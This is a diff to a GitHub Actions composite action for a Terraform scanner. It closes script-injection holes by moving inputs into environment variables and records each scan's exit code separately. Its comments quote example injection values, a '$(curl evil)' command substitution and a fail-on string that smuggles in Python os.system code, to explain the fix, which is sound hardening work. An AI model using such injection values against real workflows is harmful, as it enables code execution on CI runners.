@@ -87,24 +87,41 @@ runs:
     - name: Build detect.py args
       id: args
       shell: bash
+      # Round-5 audit fix #1 — move every user-supplied input through
+      # `env:` so the value is read at runtime (no GitHub Actions
+      # templating into the script source). A malicious caller passing
+      # `extra-args: "x $(curl evil) y"` previously had the command
+      # substitution evaluated when the bash array literal was parsed;
+      # via env it stays a literal string and is split with `read -ra`
+      # which does not perform command substitution.
+      env:
+        TFA_TARGET: ${{ inputs.target }}
+        TFA_MODE_OUT: ${{ steps.mode.outputs.mode }}
+        TFA_SECTION: ${{ inputs.section }}
+        TFA_ATTACK_GRAPH: ${{ inputs.attack-graph }}
+        TFA_BASELINE: ${{ inputs.baseline }}
+        TFA_EXTRA_ARGS: ${{ inputs.extra-args }}
+        TFA_FAIL_ON: ${{ inputs.fail-on }}
       run: |
-        ARGS=(--target "/workspace/${{ inputs.target }}" --mode "${{ steps.mode.outputs.mode }}")
-        if [ -n "${{ inputs.section }}" ]; then
-          ARGS+=(--section "${{ inputs.section }}")
+        ARGS=(--target "/workspace/${TFA_TARGET}" --mode "${TFA_MODE_OUT}")
+        if [ -n "${TFA_SECTION}" ]; then
+          ARGS+=(--section "${TFA_SECTION}")
         fi
-        if [ "${{ inputs.attack-graph }}" = "true" ]; then
+        if [ "${TFA_ATTACK_GRAPH}" = "true" ]; then
           ARGS+=(--attack-graph)
         fi
-        if [ -n "${{ inputs.baseline }}" ]; then
-          ARGS+=(--baseline "/workspace/${{ inputs.baseline }}")
+        if [ -n "${TFA_BASELINE}" ]; then
+          ARGS+=(--baseline "/workspace/${TFA_BASELINE}")
         fi
-        if [ -n "${{ inputs.extra-args }}" ]; then
-          # shellcheck disable=SC2206
-          EXTRA=(${{ inputs.extra-args }})
+        if [ -n "${TFA_EXTRA_ARGS}" ]; then
+          # `read -ra` does whitespace tokenisation but no command
+          # substitution. Same array effect as before, without the
+          # injection surface.
+          read -ra EXTRA <<<"${TFA_EXTRA_ARGS}"
           ARGS+=("${EXTRA[@]}")
         fi
         printf '%s\n' "${ARGS[@]}" > /tmp/tf-analyze-base-args
-        echo "fail-on=${{ inputs.fail-on }}" >> "$GITHUB_OUTPUT"
+        echo "fail-on=${TFA_FAIL_ON}" >> "$GITHUB_OUTPUT"
 
     - name: Pull tf-analyze image
       shell: bash
@@ -113,32 +130,41 @@ runs:
     - name: Run tf-analyze (JSON)
       id: scan
       shell: bash
+      env:
+        TFA_IMAGE: ${{ inputs.image }}
       run: |
         BASE_ARGS=()
         while IFS= read -r line; do BASE_ARGS+=("$line"); done < /tmp/tf-analyze-base-args
-        # Run detect.py three times — JSON / SARIF / HTML — so all three
-        # are available as workflow outputs without re-scanning. The
-        # cache flag means subsequent runs are near-instant.
-        docker run --rm -v "${{ github.workspace }}:/workspace" \
-          "${{ inputs.image }}" \
-          "${BASE_ARGS[@]}" --format json --cache --cache-file /tmp/tf-analyze-cache.json \
-          > "${{ github.workspace }}/tf-analyze-findings.json" 2>tf-analyze-json-stderr.txt || true
-        docker run --rm -v "${{ github.workspace }}:/workspace" \
-          "${{ inputs.image }}" \
-          "${BASE_ARGS[@]}" --format sarif --cache --cache-file /tmp/tf-analyze-cache.json \
-          > "${{ github.workspace }}/tf-analyze.sarif" 2>tf-analyze-sarif-stderr.txt || true
-        docker run --rm -v "${{ github.workspace }}:/workspace" \
-          "${{ inputs.image }}" \
-          "${BASE_ARGS[@]}" --format html --cache --cache-file /tmp/tf-analyze-cache.json \
-          > "${{ github.workspace }}/tf-analyze-report.html" 2>tf-analyze-html-stderr.txt || true
+        # Round-5 audit fix #12 — capture each scan's exit code
+        # individually. The prior `|| true` chain made a CRITICAL
+        # crash (OOM, segfault, signal 9) indistinguishable from "scan
+        # ran successfully, found findings". Exit 0 = clean; exit 1 =
+        # findings present (both valid). Exit ≥ 2 means the engine
+        # itself died — surface that as an `::error::` annotation so
+        # the workflow status reflects reality.
+        run_scan() {
+          local fmt="$1" out="$2" err="$3"
+          docker run --rm -v "${{ github.workspace }}:/workspace" \
+            "${TFA_IMAGE}" \
+            "${BASE_ARGS[@]}" --format "$fmt" --cache --cache-file /tmp/tf-analyze-cache.json \
+            > "$out" 2>"$err"
+          local rc=$?
+          if [ "$rc" -ge 2 ]; then
+            echo "::error::tf-analyze: $fmt scan crashed (exit $rc). See $err for the engine traceback."
+          fi
+          # We still allow the workflow to continue; the json-load
+          # step has a try/except (round-3 fix #5) that emits zeroed
+          # defaults so downstream steps run with a clear signal.
+          return 0
+        }
+        run_scan json    "${{ github.workspace }}/tf-analyze-findings.json"   tf-analyze-json-stderr.txt
+        run_scan sarif   "${{ github.workspace }}/tf-analyze.sarif"           tf-analyze-sarif-stderr.txt
+        run_scan html    "${{ github.workspace }}/tf-analyze-report.html"     tf-analyze-html-stderr.txt
         # `pr-summary` is a Markdown shape sized for the GitHub PR
         # comment body. Generated separately so the github-script step
         # can use it verbatim — keeps the rendered shape in the engine
         # rather than duplicating it in JS here.
-        docker run --rm -v "${{ github.workspace }}:/workspace" \
-          "${{ inputs.image }}" \
-          "${BASE_ARGS[@]}" --format pr-summary --cache --cache-file /tmp/tf-analyze-cache.json \
-          > "${{ github.workspace }}/tf-analyze-pr-summary.md" 2>tf-analyze-pr-summary-stderr.txt || true
+        run_scan pr-summary "${{ github.workspace }}/tf-analyze-pr-summary.md" tf-analyze-pr-summary-stderr.txt
         for f in tf-analyze-json-stderr.txt tf-analyze-sarif-stderr.txt tf-analyze-html-stderr.txt tf-analyze-pr-summary-stderr.txt; do
           if [ -s "$f" ]; then
             echo "::group::$f"
@@ -367,15 +393,26 @@ runs:
     - name: Apply fail-on threshold
       if: always()
       shell: bash
+      # Round-5 audit fix #1 — `${{ inputs.fail-on }}` is interpolated
+      # by GitHub Actions templating BEFORE the shell sees the heredoc,
+      # so a malicious caller could inject arbitrary Python by passing
+      # `fail-on: '"); import os; os.system("…"); _ = ("'`. The
+      # `<<'PY'` quoted heredoc prevents shell expansion but not
+      # Actions templating. Moving the input through `env:` makes the
+      # value reachable only via `os.environ`, which is a runtime
+      # variable read (no parser code-path) so injection is impossible.
+      env:
+        TFA_FAIL_ON: ${{ inputs.fail-on }}
       run: |
         python3 - <<'PY'
         import json, sys, os
         with open(os.path.join(os.environ["GITHUB_WORKSPACE"], "tf-analyze-findings.json")) as f:
             d = json.load(f)
         rank = {"CRITICAL":4,"HIGH":3,"MEDIUM":2,"LOW":1,"INFO":0}
-        threshold = rank.get("${{ inputs.fail-on }}", 3)
+        fail_on = os.environ.get("TFA_FAIL_ON", "HIGH")
+        threshold = rank.get(fail_on, 3)
         breach = [f for f in d.get("findings", []) if rank.get(f.get("urgency",""), 0) >= threshold]
         if breach:
-            print(f"::error::tf-analyze: {len(breach)} finding(s) at or above ${{ inputs.fail-on }} — failing the workflow", file=sys.stderr)
+            print(f"::error::tf-analyze: {len(breach)} finding(s) at or above {fail_on} — failing the workflow", file=sys.stderr)
             sys.exit(1)
         PY
